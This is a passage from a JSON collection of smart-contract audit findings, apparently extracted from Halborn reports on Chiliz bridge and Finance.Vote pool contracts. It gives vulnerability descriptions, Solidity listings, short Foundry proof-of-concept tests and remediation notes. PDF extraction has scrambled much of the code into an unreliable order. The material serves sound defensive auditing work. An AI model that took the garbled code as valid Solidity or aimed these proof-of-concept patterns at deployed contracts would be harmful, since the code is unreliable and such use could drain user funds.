lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , depositer , amountMinusFee ); } Proof of concept: Listing 6 1 contract Tester is DSTest { address public user1 = address (0 xB0B ); 2 Bridge internal bridge ; 3 NativeHandler internal nativeHandler ; 4 5 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 6 7 8 9 10 11 address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; function setUp () public { 31 bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE bridge . adminSetResource ( address ( nativeHandler ) , nativeHandler = new NativeHandler ( address ( bridge ) , bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; 12 13 14 15 16  pathByteGG , path , path ); 17 18  \" )); 19  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 20 21 22 23 24 25 26 27  \" )); 28 29 30 31 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); ## Chain operates with chain ID as 1. bridge . deposit { value : 5 e2 }(1 , tokenResource , test ); function testExploit () public { } } bytes memory test = \" \"; bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE Proof of concept Steps:  Set up a token bridge with the same chain-id on both sides of the bridge.  Attempt to transfer tokens across the bridge.  Observe that the tokens become stuck and are not transferred to the destination chain. Risk Level: Likelihood - 5 Impact - 5 32 Recommendation: Based on our analysis, it is recommended the following actions:  Update the implementation of the token bridge to prevent the use of the same chain-id on both sides of the bridge.  Implement a validation step that checks the chain-id of the source and destination chains and ensures that they are different.  Test the updated token bridge to ensure that it is functioning properly and preventing tokens from becoming stuck. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding the chain id validation. Commit ID: 72176b53657bc49d31bfd5f32ef73376505a5935 33 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: Critical"
        ]
    },
    {
        "title": "LACK OF QUORUM DEFINITION ON THE RELAYERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The lack of a quorum definition on the relayer threshold in this system could potentially result in low participation and lack of consensus This is because without a minimum number of on important decisions. participants required to reach consensus, it is possible for some relayers to make decisions that do not reflect the views of the majority of relayers. This can hinder the effectiveness and efficiency of the system, and can lead to conflicts and disputes among relayers. It is important for the system to define a quorum for the relayer threshold to ensure that sufficient participation is achieved and that decisions are made with the support and consensus of the majority of relayers. This can help to promote collaboration and consensus among relayers and improve the functioning and reliability of the system. Code Location: Bridge.sol#L201 Listing 7 @notice Modifies the number of votes required for a @notice Only callable by an address that currently has the /* * 1 2  proposal to be considered passed . 3  admin role . 4  changed to . 5 6 7  external onlyAdmin { 8 9 10 11 */ } @param newThreshold Value { _relayerThreshold } will be @notice Emits { RelayerThresholdChanged } event . function adminChangeRelayerThreshold ( uint newThreshold ) _relayerThreshold = newThreshold ; emit RelayerThresholdChanged ( newThreshold ); 34 Proof of concept code: Listing 8 function setUp () public { bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 6 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 14 15 16 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28 29 30 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); nativeHandler = new NativeHandler ( address ( bridge ) , bridge . adminSetResource ( address ( nativeHandler ) , function testAdminRelayerThreshold () public { bridge . adminChangeRelayerThreshold (0) ; } } bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE 35 Proof of concept: Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended that the system define a quorum for the relayer threshold to ensure that sufficient participation is achieved and that decisions are made with the support and consensus of the majority of relayers. This can be done by setting a specific minimum number of relayers required to reach consensus on key decisions, or by using a formula or algorithm to dynamically calculate the quorum based on factors such as the total number of active relayers or the value of the decision being made. By defining a quorum for the relayer threshold, the system can help to promote collaboration and consensus among relayers and improve the functioning and reliability of the system. 36 Remediation Plan: SOLVED: The Chiliz team solved the issue by adding the quorum relayer threshold definition. Commit ID: 8a0ffc0bea678f15ec4bcf318740b4170ee3ba95 37 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: High"
        ]
    },
    {
        "title": "HANDLER SHOULD ACCEPT PAYMENTS THROUGH ONLY BRIDGE CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ability of the handler to accept payments through any user using the receive() function in Solidity in this system could potentially result in loss of funds. To prevent sending funds through the receive() and fallback() functions in Solidity, you can implement checks and safeguards in your contract to ensure that only payments from specific approved con- tracts are accepted. This can be done by specifying a list of approved contracts that are allowed to send funds to your contract, and by imple- menting appropriate checks to verify that the sender of the payment is one of these approved contracts. For example, you can use the msg.sender variable in Solidity to check the sender of the payment, and only accept payments from the approved contracts. You can also use the require() function to enforce these checks and prevent payments from unauthorized contracts from being accepted. It is important to carefully review and test your contract to ensure that it properly implements these checks and safeguards. Code Location: NativeHandler.sol#L187 Listing 9 1 receive () external payable { } 38 Proof of concept: Proof of concept: Listing 10 function setUp () public { 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 CheatCodes cheats = CheatCodes (0 6  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 14 15 16 address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; 39 bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE bridge . adminSetResource ( address ( nativeHandler ) , nativeHandler = new NativeHandler ( address ( bridge ) , 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28 29 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); function testHandlerDepositDirectly () public { address ( nativeHandler ). transfer (5000 ether ); } } Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended that the system implement checks and safeguards to restrict the handler to only accept payments through bridge contract using the receive() function in Solidity. This can be done by specifying a list of approved contracts that are allowed to send funds to the handler, and by implementing appropriate checks to verify that the sender of the payment is one of these approved contracts. For example, the contract can use the msg.sender variable in Solidity to check the sender of the payment, and only accept payments from the approved contracts. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a necessary check in the handler. 40 Commit ID: 49e3c75605632664540b946df8bda7892fc7e884 41 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: High"
        ]
    },
    {
        "title": "LACK OF REFUND MECHANISM FOR OVERPAYMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "ERC20Handler contract handles ERC20 deposits and deposit executions. In the given code, the deposit function allows users to deposit native tokens, but it does not include any mechanism for refunding the user if they accidentally send more tokens than required when interacting with ERC20Handler. If a user accidentally sends more native tokens than required, they will lose their excess funds without any way to recover them. This can lead to user dissatisfaction and a loss of trust in the contract. Additionally, the contract may be at risk of attack from users who deliberately attempt to overpay in order to steal the excess funds. Code Location: Bridge.sol#L308 Listing 11 function deposit ( uint8 destinationChainID , bytes32 resourceID , address handler = _resourceIDToHandlerAddress [ resourceID ]; require ( handler != address (0) , \" resourceID not mapped to require ( msg . value >= _fee , \" invalid value \"); 1  bytes calldata data ) external payable whenNotPaused { 2 3 4 5  handler \" ); 6 7  ]; 8 9 10 11 12 13 14 15 uint256 valueToSend = msg . value - _fee ; if ( valueToSend > 0) { payable ( handler ). transfer ( valueToSend ); } uint64 depositNonce = ++ _depositCounts [ destinationChainID _depositRecords [ depositNonce ][ destinationChainID ] = data ; IDepositExecute depositHandler = IDepositExecute ( handler ); if ( msg . value > 0) { 42 } depositHandler . deposit ( resourceID , destinationChainID , 16 17  depositNonce , msg . sender , data ); 18 19  ; 20 21 } emit Deposit ( destinationChainID , resourceID , depositNonce ) Proof of concept: Listing 12 1 2 3  )); 4 5 function testRefund () public { bytes memory test = \" \"; bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" ERC20 \" bridge . deposit { value : 5 e2 }(111 , tokenResource , test ); } Risk Level: Likelihood - 3 Impact - 5 Recommendation: To address this issue, the deposit function should include a mechanism for refunding the user if they accidentally send more native tokens than required. This can be implemented by checking the amount of tokens received in the deposit function and refunding the excess amount to the user using the transfer function. This will ensure that users are protected from losing their funds due to overpayment, and will help to maintain trust in the contract. 43 Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a refund mechanism in the related handler. Commit ID: 369bb8ba9926ad704e8aebd2692f03d9f343021e 44 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: High"
        ]
    },
    {
        "title": "IMPROPER UPPER BOUND ON THE FEE DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The improper definition of an upper bound on fees in this system could potentially result in excessive fees and harm the user experience. This is because the upper bound is not adequately constrained, and it is possible for fees to be set at levels that are much higher than expected or reasonable. This can create a financial burden for users and discourage In addition, excessive fees can also lead to the use of the system. centralization and concentration of power in the hands of those who can afford to pay high fees, which can create additional security and integrity risks for the system. It is important for the system to properly define the upper bound on fees to ensure that fees are not set at excessive levels and to protect the user experience and the security of the system. Code Location: Bridge.sol#L298 Listing 13 1 2 3 4 5 6 7  ; 8 9 /* * */ @notice Changes deposit fee . @notice Only callable by admin . @param newFee Value { _fee } will be updated to . function adminChangeFee ( uint newFee ) external onlyAdmin { require ( _fee != newFee , \" Current fee is equal to new fee \" ) _fee = newFee ; } 45 Proof of concept code: Listing 14 function setUp () public { bytes32 [] memory pathByteGG = new bytes32 [](2) ; pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 6 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 14 15 16 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28 29 30 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); nativeHandler = new NativeHandler ( address ( bridge ) , bridge . adminChangeFee (1000000000000000000000000) ; bridge . adminSetResource ( address ( nativeHandler ) , function testFee () public { } } bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE 46 Proof of concept: Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended that the system properly define the upper bound on fees to ensure that fees are not set at excessive levels and to protect the user experience. This can be done by setting a specific maximum limit on fees, or by using a formula or algorithm to dynamically calculate the maximum fee based on factors such as the current market conditions or the value of the transaction. By properly defining the upper bound on fees, the system can help to prevent excessive fees and improve the user experience. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding an upper limit to the fee. 47 Commit ID: d715e18b47b17b63d3b0fdeb51dade1b18e535ee 48 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE CALL INSTEAD OF TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The transfer function is not recommended for sending native token due to its, 2300 gas unit limit. Instead, call can be used to circumvent the gas limit. Code Location: Bridge.sol#L308 Listing 15 function deposit ( uint8 destinationChainID , bytes32 resourceID , address handler = _resourceIDToHandlerAddress [ resourceID ]; require ( handler != address (0) , \" resourceID not mapped to uint64 depositNonce = ++ _depositCounts [ destinationChainID _depositRecords [ depositNonce ][ destinationChainID ] = data ; IDepositExecute depositHandler = IDepositExecute ( handler ); if ( msg . value > 0) { require ( msg . value >= _fee , \" invalid value \"); 1  bytes calldata data ) external payable whenNotPaused { 2 3 4 5  handler \" ); 6 7  ]; 8 9 10 11 12 13 14 15 16 17  depositNonce , msg . sender , data ); 18 19  ; 20 uint256 valueToSend = msg . value - _fee ; if ( valueToSend > 0) { payable ( handler ). transfer ( valueToSend ); } } } depositHandler . deposit ( resourceID , destinationChainID , emit Deposit ( destinationChainID , resourceID , depositNonce ) 49 21 Risk Level: Likelihood - 2 Impact - 4 Recommendation: Use call instead of transfer for sending native token. Remediation Plan: SOLVED: The Chiliz team solved the issue by changing the call transfer function. Commit ID: 0976828419dbaa9feabfa017a1032c4203abf6da 50 3.10 (HAL-10) MISSING REENTRANCY GUARD - LOW ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Calling external contracts is dangerous if some functions and variables are called after the external call. An attacker could use a malicious contract to perform a recursive call before calling function and take over the control flow. Code Location: BasicPoolFactory.sol Line #~112 Listing 1: BasicPoolFactory.sol (Lines 112) 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( block . timestamp > pool . startTime , ' Cannot deposit before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; } IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; 13 121 122 123 124 emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: As possible, external calls should be at the end of the function in order to to avoiding an attacker take over the control flow. If not possible, deploy some locking mechanism, like the commonly known ReentrancyGuard Make sure that any pair of code paths that have a possible instead. read/write conflict for a variable will be reentrancy guarded. Remediation Plan: SOLVED: Finance.Vote Team moved an external call to the end of the function. Listing 2: BasicPoolFactory.sol (Lines 123) 105 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; 106 require ( pool . id == poolId , ' Uninitialized pool '); 107 require ( block . timestamp > pool . startTime , ' Cannot deposit 108 109 110 111 112 before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; 14 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 } pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; bool success = IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); require ( success , ' Token transfer failed '); emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; } 15 ",
        "labels": [
            "Halborn",
            "Finance_Vote_BasicPoolFactory",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "BasicPoolFactory.sol contract is missing a safety check inside their constructors and multiple functions. Setters of address type parameters should include a zero-address check otherwise contract functionality may become inaccessible or tokens burnt forever. Code Location: BasicPoolFactory.sol Line #~48 Listing 3: BasicPoolFactory.sol (Lines ) 48 49 50 51 52 53 54 55 56 57 constructor ( address mgmt ) { management = mgmt ; } // change the management key function setManagement ( address newMgmt ) public managementOnly { address oldMgmt = management ; management = newMgmt ; emit ManagementUpdated ( oldMgmt , newMgmt ); } Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: 16 Listing 4: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without address validation. 17 ",
        "labels": [
            "Halborn",
            "Finance_Vote_BasicPoolFactory",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the BasicPoolFactory.sol contract the function does not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: BasicPoolFactory.sol Line #~48 Listing 5: BasicPoolFactory.sol (Lines ) 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; 18 79 80 81 82 } } pool . maximumDeposit = maxDeposit ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED: Finance.Vote Team added event at the end of the function. Listing 6: BasicPoolFactory.sol (Lines 83) 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) external managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token 19 arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; } pool . maximumDeposit = maxDeposit ; emit PoolAdded ( pool . id ); } 76 77 78 79 80 81 82 83 84 85 20 ",
        "labels": [
            "Halborn",
            "Finance_Vote_BasicPoolFactory",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block .timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Listing 7: BasicPoolFactory.sol (Lines 149) uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly { 148 function addPool ( 149 150 151 152 153 154 155 156 157 158 159 160 numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; } 161 162 163 164 165 166 167 168 169 21 pool . maximumDeposit = maxDeposit ; 170 171 172 } Listing 8: BasicPoolFactory.sol (Lines 54) 53 function getRewards ( uint poolId , uint receiptId ) public view returns ( uint [] memory ) { 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 } Pool storage pool = pools [ poolId ]; Receipt memory receipt = pool . receipts [ receiptId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( receipt . id == receiptId , ' Uninitialized receipt '); uint nowish = block . timestamp ; if ( nowish > pool . endTime ) { nowish = pool . endTime ; } uint secondsDiff = nowish . minus ( receipt . timeDeposited ); uint [] memory rewardsLocal = new uint []( pool . rewardsPerSecondPerToken . length ); for ( uint i = 0; i < pool . rewardsPerSecondPerToken . length ; i ++) { rewardsLocal [ i ] = ( secondsDiff . times ( pool . rewardsPerSecondPerToken [ i ]) . times ( receipt . amountDeposited )) / 1 e18 ; } return rewardsLocal ; Listing 9: BasicPoolFactory.sol (Lines 25) 24 function withdrawExcessRewards ( uint poolId ) external { Pool storage pool = pools [ poolId ]; 25 require ( pool . id == poolId , ' Uninitialized pool '); 26 require ( pool . totalDeposits == 0 , ' Cannot withdraw until 27 28 29 30 31 32 all deposits are withdrawn '); require ( block . timestamp > pool . endTime , ' Contract must reach maturity '); for ( uint i = 0; i < pool . rewardTokens . length ; i ++) { IERC20 rewardToken = IERC20 ( pool . rewardTokens [i ]) ; uint rewards = rewardToken . balanceOf ( address ( this )); 22 rewardToken . transfer ( management , rewards ); } IERC20 depositToken = IERC20 ( pool . depositToken ); depositToken . transfer ( management , depositToken . balanceOf ( address ( this )) ); emit ExcessRewardsWithdrawn ( poolId ); 33 34 35 36 37 38 39 } Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue with block.timestamp 23 ",
        "labels": [
            "Halborn",
            "Finance_Vote_BasicPoolFactory",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the BasicPoolFactory contract, there are a few instances where the multiple methods are called and the return value (bool) is ignored. BasicPoolFactory.sol Line #~103,125,147 Listing 10: BasicPoolFactory.sol (Lines 112) 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( block . timestamp > pool . startTime , ' Cannot deposit before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; } IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; 24 123 124 } Listing 11: BasicPoolFactory.sol (Lines 154,158) function withdrawExcessRewards ( uint poolId ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( pool . totalDeposits == 0 , ' Cannot withdraw until all deposits are withdrawn '); require ( block . timestamp > pool . endTime , ' Contract must reach maturity '); for ( uint i = 0; i < pool . rewardTokens . length ; i ++) { IERC20 rewardToken = IERC20 ( pool . rewardTokens [i ]) ; uint rewards = rewardToken . balanceOf ( address ( this )); rewardToken . transfer ( management , rewards ); } IERC20 depositToken = IERC20 ( pool . depositToken ); depositToken . transfer ( management , depositToken . balanceOf ( address ( this )) ); emit ExcessRewardsWithdrawn ( poolId ); } 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 Listing 12: BasicPoolFactory.sol (Lines 141,143) 125 126 127 128 129 130 131 132 133 134 135 136 function withdraw ( uint poolId , uint receiptId ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); Receipt storage receipt = pool . receipts [ receiptId ]; require ( receipt . id == receiptId , ' Can only withdraw real receipts '); require ( receipt . owner == msg . sender || block . timestamp > pool . endTime , ' Can only withdraw your own deposit '); require ( receipt . timeWithdrawn == 0 , ' Can only withdraw once per receipt '); // close re - entry gate receipt . timeWithdrawn = block . timestamp ; uint [] memory rewards = getRewards ( poolId , receiptId ); 25 pool . totalDeposits = pool . totalDeposits . minus ( receipt . amountDeposited ); for ( uint i = 0; i < rewards . length ; i ++) { pool . rewardsClaimed [ i] = pool . rewardsClaimed [ i ]. plus ( rewards [ i ]) ; IERC20 ( pool . rewardTokens [ i ]) . transfer ( receipt . owner , rewards [ i ]) ; } IERC20 ( pool . depositToken ). transfer ( receipt . owner , receipt . amountDeposited ); emit WithdrawalOccurred ( poolId , receiptId , receipt . owner ); 137 138 139 140 141 142 143 144 145 146 } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a return value check to avoid an unexpected crash of the contract. Return value checks provide better exception handling. Remediation Plan: SOLVED: Finance.Vote Team checked return values on the external calls. Listing 13: BasicPoolFactory.sol (Lines 123) 105 106 107 108 109 function deposit ( uint poolId , uint amount ) external { Pool storage pool = pools [ poolId ]; require ( pool . id == poolId , ' Uninitialized pool '); require ( block . timestamp > pool . startTime , ' Cannot deposit before pool start '); require ( block . timestamp < pool . endTime , ' Cannot deposit after pool ends '); 26 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 require ( pool . totalDeposits < pool . maximumDeposit , ' Maximum deposit already reached '); if ( pool . totalDeposits . plus ( amount ) > pool . maximumDeposit ) { amount = pool . maximumDeposit . minus ( pool . totalDeposits ) ; } pool . totalDeposits = pool . totalDeposits . plus ( amount ); pool . numReceipts = pool . numReceipts . plus (1) ; Receipt storage receipt = pool . receipts [ pool . numReceipts ]; receipt . id = pool . numReceipts ; receipt . amountDeposited = amount ; receipt . timeDeposited = block . timestamp ; receipt . owner = msg . sender ; bool success = IERC20 ( pool . depositToken ). transferFrom ( msg . sender , address ( this ) , amount ); require ( success , ' Token transfer failed '); emit DepositOccurred ( poolId , pool . numReceipts , msg . sender ) ; } 27 ",
        "labels": [
            "Halborn",
            "Finance_Vote_BasicPoolFactory",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
